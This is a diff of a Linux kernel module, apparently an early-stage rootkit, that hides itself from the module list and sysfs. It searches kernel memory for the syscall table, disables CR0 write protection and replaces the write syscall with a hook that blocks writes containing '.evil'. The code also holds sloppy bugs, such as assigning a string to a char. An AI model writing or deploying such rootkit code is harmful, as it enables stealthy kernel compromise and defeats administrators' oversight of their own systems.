@@ -26,6 +26,8 @@
 #include <linux/syscalls.h>
 #include <linux/string.h>
 #include <linux/slab.h>
+// Kernel live patch 
+//#include <linux/livepatch.h>
 
 #if defined(__i386__)
 #define START_CHECK 0xc0000000
@@ -38,37 +40,76 @@ typedef unsigned long psize;
 #endif
 
 psize *sys_call_table;
-psize **find(void) {
- psize **sctable;
- psize i = START_CHECK;
- while (i < END_CHECK) {
-  sctable = (psize **) i;
-  if (sctable[__NR_close] == (psize *) sys_close) {
-   return &sctable[0];
-  }
-  i += sizeof(void *);
- }
- return NULL;
-}
-// Kernel live patch 
-//#include <linux/livepatch.h>
+asmlinkage ssize_t (*original_write)(int fd, const char __user *buff, ssize_t count);
 
+/*
+ * Bruteforde find of sys_table in kernel memory
+ */
+psize **find_sys_tab(void) {
+  psize **sctable;
+  psize i = START_CHECK;
+  while (i < END_CHECK) {
+    sctable = (psize **) i;
+    if (sctable[__NR_close] == (psize *) sys_close) {
+      return &sctable[0];
+    }
+    i += sizeof(void *);
+  }
+  return NULL;
+}
+
+/*
+ * Hijacked sys_call
+ */
+asmlinkage ssize_t hijack_write(int fd, const char __user *buff, size_t count) {
+  int to_return; 
+  char proc_protect = ".evil"; 
+  char *kbuff = (char *) kmalloc(256,GFP_KERNEL); 
+  copy_from_user(kbuff,buff,255); 
+  if (strstr(kbuff,proc_protect)) { 
+    kfree(kbuff); 
+    return EEXIST; 
+  }
+  to_return = (*original_write)(fd,buff,count);
+  kfree(kbuff);
+  return to_return;
+}
 
 int hijack_init(void) {
-  //  list_del_init(&__this_module.list);
-  //  kobject_del(&THIS_MODULE->mkobj.kobj);
+  printk("hijack: LKM loaded\n");
 
+  list_del_init(&__this_module.list);
+  kobject_del(&THIS_MODULE->mkobj.kobj);
+  printk("hijack: LKM hidden\n");
 
-  if (sys_call_table = (psize *) find()) {
+  if (sys_call_table = (psize *) find_sys_tab()) {
     printk("hijack: sys_call_table found at %p\n",sys_call_table);
   } else {
     printk("hijack: sys_call_table not found\n");
   }
-  printk("hijack: LKM loaded\n");
+
+  write_cr0(read_cr0() & (~ 0x10000)); 
+  printk("hijack: cr0 write protection removed");
+
+  original_write = (void *) xchg(&sys_call_table[__NR_write],hijack_write);
+  printk("hijack: exchanged original sys_call with hijacked");
+
+  write_cr0(read_cr0() | 0x10000); 
+  printk("hijack: cr0 write protection activated");
+
   return 0;
 }
 
 void hijack_exit(void) {
+  write_cr0(read_cr0() & (~ 0x10000)); 
+  printk("hijack: cr0 write protection removed");
+
+  xchg(&sys_call_table[__NR_write],original_write);
+  printk("hijack: exchanged hijacked sys_call with original");
+
+  write_cr0(read_cr0() | 0x10000);
+  printk("hijack: cr0 write protection activated");
+
   printk("hijack: LKM removed\n");
 }
 
